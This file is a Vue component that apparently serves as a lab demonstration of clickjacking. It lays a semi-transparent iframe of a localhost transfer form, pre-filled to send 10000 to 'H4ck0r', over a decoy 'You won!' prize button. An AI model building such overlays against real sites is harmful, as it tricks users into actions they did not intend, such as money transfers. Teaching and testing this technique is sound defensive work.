<template>
  <div>
    <v-row>
      <v-col>
        <div class="d-flex justify-space-between align-center mb-6">
          <h1 class="text-h3">Clickjacking</h1>
        </div>

        <div class="container">
          <!-- Victim site embedded invisibly -->
          <iframe class="hidden-frame"
                  src="http://localhost:8080/clickjacking/showForm?to=H4ck0r&amount=10000"
                  frameborder="0">
          </iframe>

          <!-- Fake button that user sees -->
          <div class="fake-button"> You won! Click to see your prize </div>
        </div>

      </v-col>
    </v-row>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'


onMounted(() => {

})
</script>

<style scoped>
.container {
  position: relative;
  width: 500px;
  height: 300px;
}

/* Hidden legitimate site */
.hidden-frame {
  position: absolute;
  top: 0;
  left: 0;
  width: 500px;
  height: 500px;
  opacity: 0.3;  /* 0: Completely transparent */
  z-index: 2;  /* On top */
}

/* Fake button underneath */
.fake-button {
  position: absolute;
  top: 270px;
  left: 70px;
  width: 100px;
  height: 50px;
  background: red;
  color: white;
  text-align: center;
  line-height: 50px;
  z-index: 1;  /* Behind iframe */
}

.moving-target {
  position: absolute;
  opacity: 0.1;  /* Nearly invisible */
  transition: all 0.1s;
}

/* Move iframe to follow cursor */
.moving-target:hover {
  transform: translate(-50px, -50px);
}
</style>